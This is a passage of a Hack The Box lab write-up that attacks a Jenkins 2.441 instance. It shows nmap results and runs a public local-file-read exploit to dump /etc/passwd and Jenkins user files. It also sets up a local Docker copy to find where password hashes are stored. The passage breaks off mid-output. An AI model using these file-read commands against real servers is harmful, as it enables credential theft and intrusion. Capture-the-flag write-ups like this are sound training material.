</span>-<span class="w"> </span><span class="m">4</span>.11<span class="w"> </span><span class="o">(</span><span class="m">91</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.2<span class="w"> </span>-<span class="w"> </span><span class="m">4</span>.14<span class="w"> </span><span class="o">(</span><span class="m">90</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">4</span>.15<span class="w"> </span><span class="o">(</span><span class="m">90</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">2</span>.6.32<span class="w"> </span>-<span class="w"> </span><span class="m">3</span>.10<span class="w"> </span><span class="o">(</span><span class="m">90</span>%<span class="o">)</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">3</span><span class="w"> </span>hops
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">8080</span>/tcp<span class="o">)</span>
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>HOP<span class="w"> </span>RTT<span class="w">      </span>ADDRESS
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="m">1</span><span class="w">   </span><span class="m">41</span>.26<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.10.14.1
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="m">2</span><span class="w">   </span>...
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="m">3</span><span class="w">   </span><span class="m">41</span>.37<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.10.11.10
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>OS<span class="w"> </span>and<span class="w"> </span>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">32</span>.72<span class="w"> </span>seconds
+</span></code></pre></div>
+<p>Port <code>8080</code> has a Jenkins instance running version <code>2.441</code>.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250515003134.png" /></p>
+<p>Searching for exploits, there is an LFI one.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250515003203.png" /></p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$<span class="w"> </span>python<span class="w"> </span><span class="m">51993</span>.py<span class="w"> </span>-u<span class="w"> </span>http://10.10.11.10:8080/<span class="w"> </span>-p<span class="w"> </span>/etc/passwd
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>root:x:0:0:root:/root:/bin/bash
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>list:x:38:38:Mailing<span class="w"> </span>List<span class="w"> </span>Manager:/var/list:/usr/sbin/nologin
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>sync:x:4:65534:sync:/bin:/bin/sync
+</span></code></pre></div>
+<p>Now, we see that Jenkins has the path in <code>/var/jenkins_home</code> but we don't know what files to read.
+Deploy Jenkins locally to see all the interesting files and their paths.</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$<span class="w"> </span>docker<span class="w"> </span>pull<span class="w"> </span>jenkins/jenkins:2.441
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="m">2</span>.441:<span class="w"> </span>Pulling<span class="w"> </span>from<span class="w"> </span>jenkins/jenkins
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>1b13d4e1a46e:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span><span class="w"> </span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>a618211e3ec8:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span><span class="w"> </span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>9dc069cd1830:<span class="w"> </span>Pull<span class="w"> </span><span class="nb">complete</span><span class="w"> </span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>Digest:<span class="w"> </span>sha256:6bb8ea0eda544dddee8b3794936bd239e77281d59cce0f76586fa2c262e056f8
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Status:<span class="w"> </span>Downloaded<span class="w"> </span>newer<span class="w"> </span>image<span class="w"> </span><span class="k">for</span><span class="w"> </span>jenkins/jenkins:2.441
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>docker.io/jenkins/jenkins:2.441
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>$<span class="w"> </span>docker<span class="w"> </span>images<span class="w">                              </span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>REPOSITORY<span class="w">        </span>TAG<span class="w">       </span>IMAGE<span class="w"> </span>ID<span class="w">       </span>CREATED<span class="w">         </span>SIZE
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>jenkins/jenkins<span class="w">   </span><span class="m">2</span>.441<span class="w">     </span>fb91cdedcf6c<span class="w">   </span><span class="m">16</span><span class="w"> </span>months<span class="w"> </span>ago<span class="w">   </span>474MB
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>$<span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span>:8080<span class="w"> </span>jenkins/jenkins:2.441<span class="w">           </span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>Running<span class="w"> </span>from:<span class="w"> </span>/usr/share/jenkins/jenkins.war
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>...
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>*************************************************************
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>*************************************************************
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>*************************************************************
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>Jenkins<span class="w"> </span>initial<span class="w"> </span>setup<span class="w"> </span>is<span class="w"> </span>required.<span class="w"> </span>An<span class="w"> </span>admin<span class="w"> </span>user<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>created<span class="w"> </span>and<span class="w"> </span>a<span class="w"> </span>password<span class="w"> </span>generated.
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>Please<span class="w"> </span>use<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>password<span class="w"> </span>to<span class="w"> </span>proceed<span class="w"> </span>to<span class="w"> </span>installation:
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>e86d54dcc63f40b0af8440b05f2a6793
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>This<span class="w"> </span>may<span class="w"> </span>also<span class="w"> </span>be<span class="w"> </span>found<span class="w"> </span>at:<span class="w"> </span>/var/jenkins_home/secrets/initialAdminPassword
+</span></code></pre></div>
+<p>Browse the Jenkins site and enter the password to complete the installation and generate the files.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250515164124.png" /></p>
+<p>Once installed, enter the container.</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$<span class="w"> </span>docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-it<span class="w"> </span>87b87c16f877<span class="w"> </span>/bin/sh
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>$<span class="w"> </span>whoami
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>jenkins
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>$<span class="w"> </span>env
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="nv">JENKINS_HOME</span><span class="o">=</span>/var/jenkins_home
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="nv">JENKINS_UC_EXPERIMENTAL</span><span class="o">=</span>https://updates.jenkins.io/experimental
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="nv">HOSTNAME</span><span class="o">=</span>87b87c16f877
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="nv">HOME</span><span class="o">=</span>/var/jenkins_home
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="nv">JENKINS_UC</span><span class="o">=</span>https://updates.jenkins.io
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="nv">REF</span><span class="o">=</span>/usr/share/jenkins/ref
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="nv">TERM</span><span class="o">=</span>xterm
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="nv">JENKINS_VERSION</span><span class="o">=</span><span class="m">2</span>.441
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="nv">JENKINS_INCREMENTALS_REPO_MIRROR</span><span class="o">=</span>https://repo.jenkins-ci.org/incrementals
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="nv">PATH</span><span class="o">=</span>/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="nv">LANG</span><span class="o">=</span>C.UTF-8
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="nv">JENKINS_SLAVE_AGENT_PORT</span><span class="o">=</span><span class="m">50000</span>
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="nv">COPY_REFERENCE_FILE_LOG</span><span class="o">=</span>/var/jenkins_home/copy_reference_file.log
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="nv">JAVA_HOME</span><span class="o">=</span>/opt/java/openjdk
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="nv">PWD</span><span class="o">=</span>/
+</span></code></pre></div>
+<p>Inside <code>users</code> we find our newly created user and <code>users.xml</code> with the user path.</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$<span class="w"> </span>cat<span class="w"> </span>users.xml
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s1">&#39;1.1&#39;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span>?&gt;
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>&lt;hudson.model.UserIdMapper&gt;
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">  </span>&lt;version&gt;1&lt;/version&gt;
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">  </span>&lt;idToDirectoryNameMap<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;concurrent-hash-map&quot;</span>&gt;
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">    </span>&lt;entry&gt;
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">      </span>&lt;string&gt;administrator&lt;/string&gt;
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">      </span>&lt;string&gt;administrator_3984506477770267804&lt;/string&gt;
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">    </span>&lt;/entry&gt;
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w">  </span>&lt;/idToDirectoryNameMap&gt;
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>&lt;/hudson.model.UserIdMapper&gt;$<span class="w"> </span>
+</span></code></pre></div>
+<p>Knowing this path, we can enter the user's folder and read <code>config.xml</code> with the password.</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>$<span class="w"> </span>cat<span class="w"> </span>config.xml
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s1">&#39;1.1&#39;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span>?&gt;
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>&lt;user&gt;
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span>&lt;version&gt;10&lt;/version&gt;
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">  </span>&lt;id&gt;administrator&lt;/id&gt;
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">  </span>&lt;fullName&gt;asdf&lt;/fullName&gt;
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">  </span>&lt;properties&gt;
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">    </span>&lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">    </span>&lt;hudson.model.MyViewsProperty&gt;
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">      </span>&lt;views&gt;
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">        </span>&lt;hudson.model.AllView&gt;
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">          </span>&lt;owner<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;hudson.model.MyViewsProperty&quot;</span><span class="w"> </span><span class="nv">reference</span><span class="o">=</span><span class="s2">&quot;../../..&quot;</span>/&gt;
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">          </span>&lt;name&gt;all&lt;/name&gt;
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">          </span>&lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">          </span>&lt;filterQueue&gt;false&lt;/filterQueue&gt;
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">          </span>&lt;properties<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;hudson.model.View</span><span class="nv">$PropertyList</span><span class="s2">&quot;</span>/&gt;
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">        </span>&lt;/hudson.model.AllView&gt;
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">      </span>&lt;/views&gt;
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w">    </span>&lt;/hudson.model.MyViewsProperty&gt;
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="w">    </span>&lt;hudson.model.PaneStatusProperties&gt;
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w">      </span>&lt;collapsed/&gt;
+</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="w">    </span>&lt;/hudson.model.PaneStatusProperties&gt;
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="w">    </span>&lt;jenkins.security.seed.UserSeedProperty&gt;
+</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="w">      </span>&lt;seed&gt;4026dd2a6d770b27&lt;/seed&gt;
+</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="w">    </span>&lt;/jenkins.security.seed.UserSeedProperty&gt;
+</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="w">    </span>&lt;hudson.search.UserSearchProperty&gt;
+</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="w">      </span>&lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
+</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a><span class="w">    </span>&lt;/hudson.search.UserSearchProperty&gt;
+</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a><span class="w">    </span>&lt;hudson.model.TimeZoneProperty/&gt;
+</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a><span class="w">    </span>&lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
+</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a><span class="w">      </span>&lt;flags/&gt;
+</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a><span class="w">    </span>&lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
+</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a><span class="w">    </span>&lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
+</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a><span class="w">      </span>&lt;passwordHash&gt;#jbcrypt:<span class="nv">$2</span>a<span class="nv">$10$6</span>EJPyIFRC3o7PO1O3/ezcenFFtpgbU57.sggFWDvzPwe6mgr0EhEC&lt;/passwordHash&gt;
+</span><span id="__span-5-35"><a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a><span class="w">    </span>&lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
+</span><span id="__span-5-36"><a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a><span class="w">    </span>&lt;jenkins.security.ApiTokenProperty&gt;
+</span><span id="__span-5-37"><a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a><span class="w">      </span>&lt;tokenStore&gt;
+</span><span id="__span-5-38"><a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a><span class="w">        </span>&lt;tokenList/&gt;
+</span><span id="__span-5-39"><a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a><span class="w">      </span>&lt;/tokenStore&gt;
+</span><span id="__span-5-40"><a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a><span class="w">    </span>&lt;/jenkins.security.ApiTokenProperty&gt;
+</span><span id="__span-5-41"><a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a><span class="w">  </span>&lt;/properties&gt;
+</span><span id="__span-5-42"><a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a>&lt;/user&gt;$<span class="w"> </span>
+</span></code></pre></div>
+<h2 id="initial-access">Initial Access</h2>
+<p>Now, on the box.</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>$<span class="w"> </span>python<span class="w"> </span><span class="m">51993</span>.py<span class="w"> </span>-u<span class="w"> </span>http://10.10.11.10:8080/<span class="w"> </span>-p<span class="w"> </span>/var/jenkins_home/users/users.xml<span class="w">          </span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s1">&#39;1.1&#39;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span>?&gt;
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">      </span>&lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">  </span>&lt;idToDirectoryNameMap<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;concurrent-hash-map&quot;</span>&gt;
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">    </span>&lt;entry&gt;
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">      </span>&lt;string&gt;jennifer&lt;/string&gt;
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">  </span>&lt;version&gt;1&lt;/version&gt;
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>&lt;/hudson.model.UserIdMapper&gt;
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="w">  </span>&lt;/idToDirectoryNameMap&gt;
